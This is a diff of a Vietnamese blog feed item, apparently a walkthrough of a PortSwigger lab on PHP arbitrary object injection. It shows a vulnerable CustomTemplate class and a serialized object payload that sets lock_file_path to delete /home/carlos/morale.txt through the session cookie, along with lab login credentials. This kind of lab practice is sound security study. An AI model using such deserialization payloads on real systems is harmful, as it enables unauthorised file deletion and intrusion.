@@ -291,7 +291,7 @@ You also have access to a backup account: gregg:rosebud</p>
 <p></p>
 <p>Load lại trang và Solved.</p>
 <p></p>
-<h2 id="heading"></h2>
+<h2 id="4-arbitrary-object-injection-in-php">4. Arbitrary object injection in PHP</h2>
 <h3 id="description-3">Description</h3>
 <blockquote>
 <p>This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the morale.txt file from Carlos&rsquo;s home directory. You will need to obtain source code access to solve this lab.
@@ -330,7 +330,7 @@ You can log in to your own account using the following credentials: wiener:peter
 </span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;Could not write to &#34;</span> <span style="color:#f92672">.</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lock_file_path</span>);
 </span></span><span style="display:flex;"><span>            }
 </span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">file_put_contents</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">template_file_path</span>, $template) <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>) {
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;Could not write to &#34;</span> <span style="color:#f92672">.</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">template_file_path</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;Could not write to &#34;</span> <span style="color:#f92672">.</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">template_file_path</span>);                    
 </span></span><span style="display:flex;"><span>            }
 </span></span><span style="display:flex;"><span>        }
 </span></span><span style="display:flex;"><span>    }
@@ -348,11 +348,11 @@ You can log in to your own account using the following credentials: wiener:peter
  <code>__destruct()</code> khi nó thực hiện xóa file tại <code>lock_file_path</code>, nếu nó tồn tại. Mặt khác <code>__destruct()</code> sẽ được gọi khi server thực hiện deserialize.</p>
 <p>=&gt; Ta có thể tận dụng session cookie để thực hiện Object Injection như sau:</p>
 <pre tabindex="0"><code>O: 14: &#34;CustomTemplate&#34;: 1: {s: 14: &#34;lock_file_path&#34;; s: 23: &#34;/home/carlos/morale.txt&#34;;}
-</code></pre><p>Endcode base64 và edit cookie:
-</p>
+</code></pre><p>Endcode base64 và edit cookie:</p>
 <p></p>
-<p>Solved
-</p>
+<p></p>
+<p>Solved</p>
+<p></p>
 ]]></description>
 </item>
 <item>
